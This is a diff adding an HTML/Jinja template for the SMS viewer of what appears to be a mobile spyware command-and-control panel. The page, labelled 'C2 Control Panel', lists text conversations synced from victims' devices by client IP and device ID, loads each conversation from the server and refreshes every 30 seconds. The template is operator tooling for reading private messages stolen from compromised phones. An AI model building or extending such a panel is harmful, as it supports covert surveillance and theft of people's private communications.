@@ -1,0 +1,563 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SMS Conversations - {{ client_ip }} - C2 Server</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        .conversations-grid {
+            display: grid;
+            grid-template-columns: 300px 1fr;
+            gap: 20px;
+            min-height: 600px;
+        }
+
+        /* Contact List Sidebar */
+        .contact-list {
+            background: var(--dark-2);
+            border-radius: 20px;
+            border: 1px solid var(--border);
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .contact-list-header {
+            padding: 20px;
+            border-bottom: 1px solid var(--border);
+            background: var(--dark-3);
+        }
+
+        .contact-list-header h3 {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: var(--text-primary);
+        }
+
+        .contact-list-header h3 i {
+            color: var(--accent);
+        }
+
+        .contact-items {
+            flex: 1;
+            overflow-y: auto;
+            max-height: 600px;
+        }
+
+        .contact-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 15px 20px;
+            border-bottom: 1px solid var(--border);
+            cursor: pointer;
+            transition: all 0.2s ease;
+            background: var(--dark-2);
+        }
+
+        .contact-item:hover {
+            background: var(--dark-3);
+            transform: translateX(5px);
+        }
+
+        .contact-item.active {
+            background: linear-gradient(90deg, rgba(69, 237, 242, 0.1), transparent);
+            border-left: 3px solid var(--accent);
+        }
+
+        .contact-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 12px;
+            background: linear-gradient(135deg, var(--accent), var(--primary));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            color: #071219;
+            flex-shrink: 0;
+        }
+
+        .contact-info {
+            flex: 1;
+            min-width: 0;
+        }
+
+        .contact-name {
+            font-weight: 600;
+            color: var(--text-primary);
+            margin-bottom: 4px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .contact-preview {
+            font-size: 0.8rem;
+            color: var(--text-muted);
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .contact-meta {
+            text-align: right;
+        }
+
+        .contact-time {
+            font-size: 0.7rem;
+            color: var(--text-muted);
+            margin-bottom: 4px;
+        }
+
+        .contact-badge {
+            background: var(--accent);
+            color: #071219;
+            padding: 2px 6px;
+            border-radius: 10px;
+            font-size: 0.7rem;
+            font-weight: bold;
+        }
+
+        /* Chat Area */
+        .chat-area {
+            background: var(--dark-2);
+            border-radius: 20px;
+            border: 1px solid var(--border);
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+
+        .chat-header {
+            padding: 20px;
+            border-bottom: 1px solid var(--border);
+            background: var(--dark-3);
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .chat-header-avatar {
+            width: 48px;
+            height: 48px;
+            border-radius: 14px;
+            background: linear-gradient(135deg, var(--accent), var(--primary));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 1.2rem;
+            color: #071219;
+        }
+
+        .chat-header-info h2 {
+            margin-bottom: 5px;
+        }
+
+        .chat-header-info p {
+            color: var(--text-muted);
+            font-size: 0.9rem;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .chat-messages {
+            flex: 1;
+            padding: 20px;
+            overflow-y: auto;
+            max-height: 500px;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            background: var(--dark-1);
+        }
+
+        .message {
+            display: flex;
+            max-width: 70%;
+        }
+
+        .message.sent {
+            align-self: flex-end;
+        }
+
+        .message.received {
+            align-self: flex-start;
+        }
+
+        .message-bubble {
+            padding: 12px 16px;
+            border-radius: 18px;
+            position: relative;
+            word-wrap: break-word;
+        }
+
+        .message.sent .message-bubble {
+            background: linear-gradient(135deg, var(--accent), var(--primary));
+            color: #071219;
+            border-bottom-right-radius: 4px;
+        }
+
+        .message.received .message-bubble {
+            background: var(--dark-3);
+            color: var(--text-primary);
+            border-bottom-left-radius: 4px;
+            border: 1px solid var(--border);
+        }
+
+        .message-time {
+            font-size: 0.7rem;
+            margin-top: 4px;
+            color: var(--text-muted);
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .message.sent .message-time {
+            justify-content: flex-end;
+        }
+
+        .message-status {
+            font-size: 0.7rem;
+            margin-left: 4px;
+        }
+
+        .message-status i {
+            font-size: 0.6rem;
+        }
+
+        .message-status.delivered { color: var(--accent); }
+        .message-status.read { color: var(--success); }
+
+        .date-divider {
+            text-align: center;
+            margin: 20px 0;
+            position: relative;
+        }
+
+        .date-divider::before {
+            content: '';
+            position: absolute;
+            left: 0;
+            top: 50%;
+            width: 100%;
+            height: 1px;
+            background: var(--border);
+            z-index: 1;
+        }
+
+        .date-divider span {
+            background: var(--dark-2);
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            color: var(--text-muted);
+            position: relative;
+            z-index: 2;
+            border: 1px solid var(--border);
+        }
+
+        .chat-footer {
+            padding: 20px;
+            border-top: 1px solid var(--border);
+            background: var(--dark-3);
+            display: flex;
+            gap: 10px;
+        }
+
+        .chat-footer input {
+            flex: 1;
+            background: var(--dark-2);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 12px 16px;
+            color: var(--text-primary);
+        }
+
+        .chat-footer input:focus {
+            outline: none;
+            border-color: var(--accent);
+        }
+
+        .chat-footer button {
+            width: 48px;
+            height: 48px;
+            border-radius: 12px;
+            background: linear-gradient(135deg, var(--accent), var(--primary));
+            border: none;
+            color: #071219;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .chat-footer button:hover {
+            transform: scale(1.05);
+        }
+
+        /* Empty State */
+        .no-selection {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100%;
+            color: var(--text-muted);
+            gap: 20px;
+        }
+
+        .no-selection i {
+            font-size: 4rem;
+            color: var(--dark-3);
+        }
+
+        /* Search */
+        .search-box {
+            margin: 15px 20px;
+        }
+
+        .search-box input {
+            width: 100%;
+            padding: 10px 15px;
+            background: var(--dark-3);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            color: var(--text-primary);
+        }
+
+        .search-box input:focus {
+            outline: none;
+            border-color: var(--accent);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Navigation -->
+        <nav class="navbar">
+            <div class="navbar-brand">
+                <i class="fas fa-skull"></i>
+                <span>C2 Control Panel</span>
+            </div>
+            <div class="navbar-menu">
+                <a href="/"><i class="fas fa-home"></i> Dashboard</a>
+                <a href="/gallery"><i class="fas fa-images"></i> Gallery</a>
+                <a href="/client/{{ client_ip }}"><i class="fas fa-arrow-left"></i> Back to Device</a>
+            </div>
+        </nav>
+
+        <!-- Header -->
+        <div style="background: var(--dark-2); border-radius: 1rem; padding: 20px; margin-bottom: 30px; border: 1px solid var(--border);">
+            <h1 style="display: flex; align-items: center; gap: 10px;">
+                <i class="fas fa-sms" style="color: var(--accent);"></i>
+                SMS Messages - {{ client_ip }}
+            </h1>
+            <p style="color: var(--text-secondary); margin-top: 10px;">
+                <i class="fas fa-mobile-alt"></i> Device ID: {{ device_id }}
+            </p>
+        </div>
+
+        <!-- Main Conversations Area -->
+        <div class="conversations-grid">
+            <!-- Contact List Sidebar -->
+            <div class="contact-list">
+                <div class="contact-list-header">
+                    <h3><i class="fas fa-users"></i> Conversations</h3>
+                </div>
+
+                <div class="search-box">
+                    <i class="fas fa-search" style="position: absolute; margin-left: 10px; margin-top: 12px; color: var(--text-muted);"></i>
+                    <input type="text" id="contactSearch" placeholder="Search contacts..." style="padding-left: 35px;" onkeyup="filterContacts()">
+                </div>
+
+                <div class="contact-items" id="contactList">
+                    {% for conv in conversations %}
+                    <div class="contact-item {% if loop.first %}active{% endif %}"
+                         onclick="loadConversation('{{ conv.filename }}', this)"
+                         data-contact="{{ conv.contact|lower }}"
+                         data-filename="{{ conv.filename }}">
+                        <div class="contact-avatar">
+                            {{ conv.contact[:2]|upper if conv.contact not in ['unknown', 'me'] else '?' }}
+                        </div>
+                        <div class="contact-info">
+                            <div class="contact-name">{{ conv.contact if conv.contact not in ['unknown', 'me'] else 'Unknown' }}</div>
+                            <div class="contact-preview">{{ conv.last_message }}</div>
+                        </div>
+                        <div class="contact-meta">
+                            <div class="contact-time">{{ conv.last_time }}</div>
+                            <div class="contact-badge">{{ conv.total }}</div>
+                        </div>
+                    </div>
+                    {% else %}
+                    <div style="text-align: center; padding: 50px; color: var(--text-muted);">
+                        <i class="fas fa-comment-slash" style="font-size: 2rem; margin-bottom: 10px; display: block;"></i>
+                        No conversations found
+                    </div>
+                    {% endfor %}
+                </div>
+            </div>
+
+            <!-- Chat Area -->
+            <div class="chat-area" id="chatArea">
+    {% if conversations %}
+    <div id="chatContainer" data-current-filename="{{ first_conversation }}">
+        {% with contact_name=first_contact, messages=first_messages %}
+            {% include 'sms_conversation.html' %}
+        {% endwith %}
+    </div>
+    {% else %}
+    <div class="no-selection">
+        <i class="fas fa-comment-dots"></i>
+        <h3>No Conversations</h3>
+        <p>No SMS messages have been synced from this device yet.</p>
+    </div>
+    {% endif %}
+</div>
+        </div>
+    </div>
+
+    <script>
+        let currentConversation = '{{ conversations[0].filename if conversations else "" }}';
+
+        function filterContacts() {
+            const searchTerm = document.getElementById('contactSearch').value.toLowerCase();
+            const contacts = document.querySelectorAll('.contact-item');
+
+            contacts.forEach(contact => {
+                const contactName = contact.getAttribute('data-contact');
+                if (contactName.includes(searchTerm)) {
+                    contact.style.display = 'flex';
+                } else {
+                    contact.style.display = 'none';
+                }
+            });
+        }
+
+        function loadConversation(filename, element) {
+    // Update active state
+    document.querySelectorAll('.contact-item').forEach(item => {
+        item.classList.remove('active');
+    });
+    element.classList.add('active');
+    currentConversation = filename;
+
+    // Show loading in messages area
+    const chatMessages = document.querySelector('.chat-messages');
+    if (chatMessages) {
+        chatMessages.innerHTML = `
+            <div style="display: flex; justify-content: center; align-items: center; height: 200px;">
+                <div class="spinner"></div>
+            </div>
+        `;
+    }
+
+    // Fetch conversation as JSON
+    fetch(`/client/{{ client_ip }}/sms/${filename}`)
+        .then(response => response.json())
+        .then(data => {
+            if (data.error) {
+                throw new Error(data.error);
+            }
+
+            // Update header
+            const chatHeader = document.querySelector('.chat-header');
+            if (chatHeader) {
+                const contactName = data.contact_name;
+                const avatar = contactName.slice(0, 2).toUpperCase();
+                chatHeader.innerHTML = `
+                    <div class="chat-header-avatar">${avatar}</div>
+                    <div class="chat-header-info">
+                        <h2>${contactName}</h2>
+                        <p><i class="fas fa-phone-alt"></i> ${contactName}</p>
+                    </div>
+                `;
+            }
+
+            // Update messages
+            if (chatMessages) {
+                let lastDate = '';
+                let messagesHtml = '';
+
+                data.messages.forEach(msg => {
+                    const msgDate = formatMessageDate(msg.time);
+                    if (msgDate !== lastDate) {
+                        messagesHtml += `
+                            <div class="date-divider">
+                                <span>${msgDate}</span>
+                            </div>
+                        `;
+                        lastDate = msgDate;
+                    }
+
+                    const messageClass = msg.from === 'me' ? 'sent' : 'received';
+                    const timeStr = formatMessageTime(msg.time);
+                    const checkmark = msg.from === 'me' ?
+                        '<span class="message-status delivered"><i class="fas fa-check"></i></span>' : '';
+
+                    messagesHtml += `
+                        <div class="message ${messageClass}">
+                            <div class="message-bubble">
+                                ${msg.text}
+                                <div class="message-time">
+                                    ${timeStr} ${checkmark}
+                                </div>
+                            </div>
+                        </div>
+                    `;
+                });
+
+                chatMessages.innerHTML = messagesHtml;
+                chatMessages.scrollTop = chatMessages.scrollHeight;
+            }
+        })
+        .catch(error => {
+            console.error('Error loading conversation:', error);
+            if (chatMessages) {
+                chatMessages.innerHTML = `
+                    <div class="no-selection">
+                        <i class="fas fa-exclamation-triangle" style="color: var(--danger);"></i>
+                        <h3>Error Loading Conversation</h3>
+                        <p>${error.message}</p>
+                    </div>
+                `;
+            }
+        });
+}
+
+        function formatMessageTime(timestamp) {
+            const date = new Date(timestamp);
+            return date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+        }
+
+        function formatMessageDate(timestamp) {
+            const date = new Date(timestamp);
+            const today = new Date();
+            const yesterday = new Date(today);
+            yesterday.setDate(yesterday.getDate() - 1);
+
+            if (date.toDateString() === today.toDateString()) {
+                return 'Today';
+            } else if (date.toDateString() === yesterday.toDateString()) {
+                return 'Yesterday';
+            } else {
+                return date.toLocaleDateString([], { year: 'numeric', month: 'short', day: 'numeric' });
+            }
+        }
+
+        // Auto-refresh every 30 seconds
+        setInterval(() => {
+            if (currentConversation) {
+                const activeContact = document.querySelector('.contact-item.active');
+                if (activeContact) {
+                    loadConversation(currentConversation, activeContact);
+                }
+            }
+        }, 30000);
+    </script>
+</body>
+</html>
